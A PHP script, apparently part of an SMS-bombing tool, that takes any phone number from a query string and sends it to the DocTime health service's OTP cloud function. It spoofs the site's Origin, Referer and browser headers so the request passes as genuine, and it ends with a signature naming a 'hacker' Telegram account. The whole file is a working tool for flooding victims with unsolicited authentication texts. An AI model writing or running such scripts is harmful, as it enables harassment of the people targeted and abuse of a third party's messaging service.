<?php

// Get the phone number from the URL query string
$phone = isset($_GET['phone']) ? $_GET['phone'] : '';

// Format the phone number to ensure it's 11 digits
$formattedPhone = str_replace(['+', ' ', '-', '(', ')'], '', $phone);

// Ensure the phone number is 11 digits
if (strlen($formattedPhone) === 11 && $formattedPhone[0] === '0') {
    // Remove the leading "0"
    $phoneToUse = substr($formattedPhone, 1);
} elseif (strlen($formattedPhone) === 10) {
    // If it’s already 10 digits, use it as is
    $phoneToUse = $formattedPhone;
} elseif (strlen($formattedPhone) === 13 && substr($formattedPhone, 0, 4) === '+88') {
    // If it’s in the format +88XXXXXXXXXX, remove the country code
    $phoneToUse = substr($formattedPhone, 3);
} else {
    echo "Invalid phone number. Please provide an 11-digit phone number.";
    exit;
}

// Prepare the data for the POST request
$data = [
    "data" => [
        "flag" => "https://doctime-core-ap-southeast-1.s3.ap-southeast-1.amazonaws.com/images/country-flags/flag-800.png",
        "code" => "88",
        "contact_no" => $phoneToUse,
        "country_calling_code" => "88",
        "headers" => [
            "PlatForm" => "Web"
        ]
    ]
];

// Convert data to JSON format
$jsonData = json_encode($data);

// Initialize cURL
$url = 'https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber';
$ch = curl_init($url);

// Set the necessary options for cURL
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Accept: */*',
    'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,bn;q=0.7',
    'Content-Type: application/json',
    'Origin: https://doctime.com.bd',
    'Referer: https://doctime.com.bd/',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: cross-site',
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36',
]);

// Set the JSON data to be sent in the POST request
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);

// Execute the cURL request
$response = curl_exec($ch);

// Close the cURL session
curl_close($ch);

// Output the success message
if ($response) {
    echo "Success Response: \n";
    echo "Api Owner : Mɾ. Jҽɾɾყ 😈\n";
    echo "Telegram : t.me/Mr_Jerry_Hacker\n";
} else {
    echo "Failed to send OTP. Please try again.";
}

?>
